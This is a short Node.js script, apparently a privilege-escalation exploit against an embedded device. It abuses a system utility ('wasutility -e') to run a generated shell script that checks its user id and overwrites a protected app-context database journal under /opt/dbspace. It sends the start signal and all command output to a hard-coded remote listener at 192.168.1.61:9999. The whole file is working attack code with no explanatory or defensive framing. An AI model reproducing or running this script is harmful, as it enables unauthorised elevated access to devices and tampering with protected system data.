"use strict";
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.61';
var PORT = 9999;
function post(path, text) {
  var body = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + body.length + '\r\nConnection: close\r\n\r\n';
  var s = net.connect(PORT, HOST);
  s.on('connect', function(){ s.write(hdr); s.write(body); s.end(); });
  s.on('error', function(e){ console.log('ERR', e.message); });
}
function run(cmd, timeout) {
  try { return '[0] ' + cp.execSync(cmd, {timeout: timeout||20000, maxBuffer: 16*1024*1024}).toString().slice(0,2000); }
  catch(e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=e.stderr.toString(); return '[err '+(e.status||'?')+'] '+(o||e.message).slice(0,2000); }
}
post('/p92start', 'start ' + new Date().toISOString());
var out = [];
out.push('write script => ' + run('printf "#!/bin/sh\\nid > /home/owner/share/tmp/sdk_tools/was_id2.txt\\ncp /home/owner/share/tmp/sdk_tools/appctx_hot_journal /opt/dbspace/.app-context.db-journal\\n" > /home/owner/share/tmp/sdk_tools/was_copy.sh; chmod 755 /home/owner/share/tmp/sdk_tools/was_copy.sh; ls -la /home/owner/share/tmp/sdk_tools/was_copy.sh', 10000));
out.push('was -e script => ' + run('/usr/bin/wasutility -e /home/owner/share/tmp/sdk_tools/was_copy.sh 2>&1', 20000));
out.push('read id => ' + run('cat /home/owner/share/tmp/sdk_tools/was_id2.txt 2>&1', 10000));
out.push('md5 jrn => ' + run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000));
post('/p92out', out.join('\n'));
